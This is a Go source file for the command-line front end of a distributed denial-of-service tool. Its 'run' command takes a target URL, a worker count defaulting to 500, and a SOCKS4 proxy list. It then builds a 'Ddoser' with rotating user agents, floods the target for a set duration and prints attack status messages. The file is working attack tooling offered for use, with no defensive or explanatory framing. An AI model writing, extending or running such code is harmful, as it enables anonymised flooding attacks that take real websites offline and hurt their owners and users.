package main

import (
	"fmt"
	"time"

	"github.com/mkideal/cli"
)

type runT struct {
	cli.Helper
	Url      string `cli:"*url"`
	Worker   int    `cli:"w,workers" dft:"500"`
	File     string `cli:"f,file" dft:"socks4.txt"`
	Duration int    `cli:"d,duration" dft:"10"`
}

var attackCommand = &cli.Command{
	Name: "run",
	Desc: "Deploy the attack",
	Argv: func() interface{} {
		return new(runT)
	},
	Fn: func(ctx *cli.Context) error {
		argv := ctx.Argv().(*runT)
		useragents := getUserAgents(500)
		proxies := readLines(argv.File)

		ddoser, err := NewDdoser(argv.Url, argv.Worker, useragents, proxies)
		if err != nil {
			return err
		}

		fmt.Println("[+] Starting attack...")

		ddoser.Run()

		time.Sleep(time.Duration(argv.Duration) * time.Second)

		fmt.Println("[+] Attack finished")

		return nil
	},
}
